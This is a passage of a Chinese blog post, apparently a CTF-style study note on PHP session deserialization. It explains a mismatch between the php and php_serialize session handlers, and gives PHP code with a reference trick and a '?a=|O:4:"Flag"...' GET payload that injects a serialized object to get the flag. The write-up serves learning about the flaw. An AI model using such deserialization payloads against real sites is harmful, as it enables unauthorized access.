+<li>在<code>index.php</code>页面中，启动了一个 PHP 会话，默认是使用<code>php</code>的方式，有一个<code>Flag</code>的类，其中有两个属性分别是<code>name</code>和<code>her</code>，在发序列化时会触发<code>__wakeup</code>魔术方法，先给<code>her</code>赋值为一个随机的1到10000的MD5值，并和<code>name</code>进行比较，条件满足就会包含<code>flag.php</code>页面，并输出flag，但是在这个页面中没有输入点</li>
+<li>在<code>hint.php</code>页面中，声明了session的存储方式为<code>php_serialize</code>，并可以提交GET参数<code>a</code>，有输入的地方</li>
+</ul>
+<p>在这题中，满足了可以在<code>hint.php</code>页面中写入，可以在<code>index.php</code>页面中读取，并且两个页面的存储方式不一样，说明存在有session反序列化漏洞</p>
+<p>要想读取flag，就要满足<code>name</code>和<code>her</code>的值相等，可以使用取地址符<code>&amp;</code>满足这个条件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$her</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>();<br><span class="hljs-variable">$a</span>-&gt;name = &amp;<span class="hljs-variable">$a</span>-&gt;her;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420200436497.png" srcset="/img/loading.gif" lazyload alt="image-20250420200436497"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 序列化后的结果</span><br>O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Flag&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;N;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;her&quot;</span>;R:<span class="hljs-number">2</span>;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>在<code>hint.php</code>页面提交GET参数a</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?a=|O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Flag&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;N;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;her&quot;</span>;R:<span class="hljs-number">2</span>;&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420200809940.png" srcset="/img/loading.gif" lazyload alt="image-20250420200809940"></p>
+<p>然后直接访问<code>index.php</code>页面就可以得到flag了</p>
+<p><img src="/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420200826403.png" srcset="/img/loading.gif" lazyload alt="image-20250420200826403"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/" class="category-chain-item">漏洞笔记</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="category-chain-item">PHP反序列化</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="print-no-link">#学习笔记</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Session反序列化</div>
+      <div>https://yschen20.github.io/2025/04/25/Session反序列化/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>chen</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年4月25日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2025年4月25日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/" title="Git和Git文件导致源码泄露">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Git和Git文件导致源码泄露</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/04/25/%E5%9C%A8Ubuntu%E9%83%A8%E7%BD%B2%E5%AE%9D%E5%A1%94/" title="在Ubuntu部署宝塔">
+                        <span class="hidden-mobile">在Ubuntu部署宝塔</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  var relativeDate = function() {
+    var updatedTime = document.getElementById('updated-time');
+    if (updatedTime) {
+      var text = updatedTime.textContent;
+      var reg = /\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}(?:Z|[+-]\d{2}:\d{2})/;
+      var matchs = text.match(reg);
+      if (matchs) {
+        var relativeTime = moment(matchs[0]).fromNow();
+        updatedTime.textContent = text.replace(reg, relativeTime);
+      }
+      updatedTime.style.display = '';
+    }
+  };
+  Fluid.utils.createScript('https://lib.baomitu.com/moment.js/2.29.4/moment.min.js', function() {
+    if (!'zh-cn'.startsWith('en')) {
+      Fluid.utils.createScript('https://lib.baomitu.com/moment.js/2.29.4/locale/zh-cn.min.js', function() {
+        relativeDate();
+      });
+    } else {
+      relativeDate();
+    }
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
